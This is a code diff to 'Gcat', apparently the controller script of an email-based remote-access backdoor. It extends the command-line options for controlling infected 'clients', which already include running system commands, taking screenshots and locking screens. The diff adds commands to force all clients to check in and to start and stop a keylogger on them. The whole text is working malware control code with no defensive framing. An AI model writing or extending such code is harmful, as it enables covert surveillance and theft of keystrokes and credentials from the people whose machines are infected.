@@ -147,6 +147,7 @@ class Gcat:
 
 
 if __name__ == '__main__':
+
     parser = argparse.ArgumentParser(description="Gcat", version='0.0.1')
     parser.add_argument("-l", dest="list", action="store_true", help="List available clients")
     parser.add_argument("--id", dest='id', default='ALL', type=str, help="Client to target")
@@ -155,6 +156,9 @@ if __name__ == '__main__':
     parser.add_argument("-c", metavar='cmd', dest='cmd', type=str, help='Execute a system command')
     parser.add_argument("-s", dest='screen', action='store_true', help='Take a screenshot')
     parser.add_argument("-L", dest='lockscreen', action='store_true', help='Lock the clients screen')
+    parser.add_argument("-F", dest='forcecheckin', action='store_true', help='Force all clients to check in')
+    parser.add_argument("-K", dest='keylogger', action='store_true', help='Start keylogger')
+    parser.add_argument("-k", dest='stopkeylogger', action='store_true', help='Stop keylogger')
     
     if len(sys.argv) is 1:
         parser.print_help()
@@ -179,6 +183,15 @@ if __name__ == '__main__':
 
     elif args.lockscreen:
         gcat.sendEmail(args.id, jobid, 'lockscreen')
+
+    elif args.forcecheckin:
+        gcat.sendEmail(args.id, jobid, 'forcecheckin')
+
+    elif args.keylogger:
+        gcat.sendEmail(args.id, jobid, 'startkeylogger')
+
+    elif args.stopkeylogger:
+        gcat.sendEmail(args.id, jobid, 'stopkeylogger')
 
     elif args.jobid:
         gcat.getJobResults(args.id, args.jobid)
